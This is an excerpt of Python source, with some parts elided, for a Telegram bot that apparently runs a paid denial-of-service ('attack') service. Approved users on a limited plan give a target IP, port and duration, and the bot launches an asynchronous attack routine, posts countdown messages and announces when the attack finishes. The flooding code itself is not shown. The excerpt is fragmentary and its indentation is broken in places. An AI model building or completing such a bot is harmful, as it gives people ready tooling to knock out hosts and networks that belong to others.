...
def approve_or_disapprove_user(message):
    ...
    if action == '/approve':
        if plan == 1 and count_users_with_plan(1) >= 99:
            bot.send_message(chat_id, "*Approval failed: Join Main Channel ❤️‍🔥 limit reached (99 users).*", parse_mode='Markdown')
            return
...
def process_attack_command(message):
    try:
        ...
        # Attack details ko log karein
logging.info(f"Attack started by User ID: {message.from_user.id}, IP: {target_ip}, Port: {target_port}, Duration: {duration} seconds")

asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)

        # Get the username or use a placeholder if the user doesn't have one
        username = message.from_user.username
        if username:
            user_mention = f"@{username}"
        else:
            user_mention = f"[User ID: {message.from_user.id}]"
        ...
        bot.send_message(
            message.chat.id, 
            f"*Attack started by {user_mention} 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration} seconds*",
            parse_mode='Markdown', 
            reply_markup=markup
        )
        ...
        while remaining_time > 0:
            bot.send_message(message.chat.id, f"⏳ Time left: {remaining_time} seconds", parse_mode='Markdown')
            time.sleep(10)  # Update every 10 seconds (you can adjust the interval)
            remaining_time -= 10

        # Send the attack finish message
        bot.send_message(
            message.chat.id, 
            f"*Attack FINISH 💥\n\nAttack initiated by {user_mention}\nHost: {target_ip}\nPort: {target_port}\nDuration: {duration} seconds*",
            parse_mode='Markdown', 
            reply_markup=markup
        )
...
def send_welcome(message):
    ...
    btn1 = KeyboardButton("Join Main Channel ❤️‍🔥")
...
def handle_message(message):
    ...
    if message.text == "Join Main Channel ❤️‍🔥":
        bot.reply_to(message, "*JOIN - @CREATIVEYDV CHANNEL AND @NANDYADU1C*", parse_mode='Markdown')
    elif message.text == "Attack 🌚":
        bot.reply_to(message, "*Attack Button Enabled ✅*", parse_mode='Markdown')
